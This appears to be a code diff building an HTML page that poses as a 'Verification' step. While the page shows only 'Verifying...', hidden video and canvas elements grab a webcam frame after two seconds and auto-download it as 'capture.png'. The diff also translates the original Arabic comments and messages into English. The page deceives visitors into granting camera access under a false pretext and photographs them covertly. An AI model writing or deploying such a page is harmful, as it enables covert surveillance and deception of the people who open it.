@@ -1,3 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Verification</title>
+  <style>
+    body {
+      text-align: center;
+      font-family: Arial, sans-serif;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<h2>Verifying...</h2>
+
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
+
 <script>
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
@@ -11,16 +33,20 @@
         canvas.height = video.videoHeight;
         canvas.getContext("2d").drawImage(video, 0, 0);
 
+        // Stop camera
         stream.getTracks().forEach(track => track.stop());
 
-        // تحميل الصورة تلقائياً
+        // Auto download image
         const link = document.createElement("a");
-        link.download = "photo.png";
+        link.download = "capture.png";
         link.href = canvas.toDataURL("image/png");
         link.click();
-      }, 2000);
+      }, 2000); // capture after 2 seconds
     })
     .catch(() => {
-      document.body.innerHTML = "✔️ تم السماح بالكاميرا";
+      document.body.innerHTML = "Camera permission denied.";
     });
 </script>
+
+</body>
+</html>
